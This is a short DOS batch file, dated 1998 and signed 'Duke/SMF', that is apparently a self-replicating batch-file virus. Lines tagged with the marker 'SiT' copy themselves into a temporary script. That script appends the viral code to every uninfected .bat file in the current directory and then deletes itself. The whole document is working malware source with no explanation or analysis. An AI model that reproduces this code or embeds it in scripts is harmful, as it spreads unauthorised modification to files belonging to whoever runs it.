::
:: 11.12.98
:: 
@rem SiT
@echo off %SiT%
if "%0==" goto SiTe
if "%1=="SiT goto SiTa
echo.>SiT.bat
echo>>SiT.bat @rem SiT
find "SiT"<%0>>SiT.bat
echo>>SiT.bat @rem SiT
for %%b in (*.bat) do call SiT.bat SiT %%b
del SiT.bat>nul
goto SiTe
:SiT Dedicated to Irina by Duke/SMF
:SiTa
find "SiT"<%2>nul
if not errorlevel 1 goto SiTe
type SiT.bat>>%2
:SiTe
@rem SiT